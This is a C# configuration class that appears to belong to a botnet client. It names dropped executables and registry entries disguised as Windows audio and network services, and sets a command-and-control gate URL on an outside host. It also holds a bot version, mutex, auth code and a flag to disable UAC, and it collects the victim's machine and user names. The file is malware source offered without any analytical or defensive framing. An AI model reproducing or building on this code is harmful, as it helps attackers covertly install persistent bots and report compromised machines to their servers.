using System;

namespace Helper;

internal class cConfig
{
	public string[] sFileName = new string[2] { "audioqd.exe", "WUDHosts.exe" };

	public string[] sRegName = new string[2] { "Windows Audio HD Driver", "Windows-Network Service Component" };

	public string sCServerAddress = "http://www.dirty-things.at/vic/gate.php";

	public string sBotVersion = "2.1";

	public string sMutex = "mnUXsx75Xusv";

	public string sAuthCode = "WICKED!";

	public int iConnectionInterval = 1;

	public bool bDisableUAC;

	public string sHWID = string.Empty;

	public string sPCName = Environment.MachineName + "|" + Environment.UserName;

	public string sUserName = Environment.UserName;

	public string sWinVersion = string.Empty;

	public string[] sFilePath = new string[2];

	public cConfig()
	{
		sFilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + sFileName[0];
		sFilePath[1] = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + sFileName[1];
	}
}
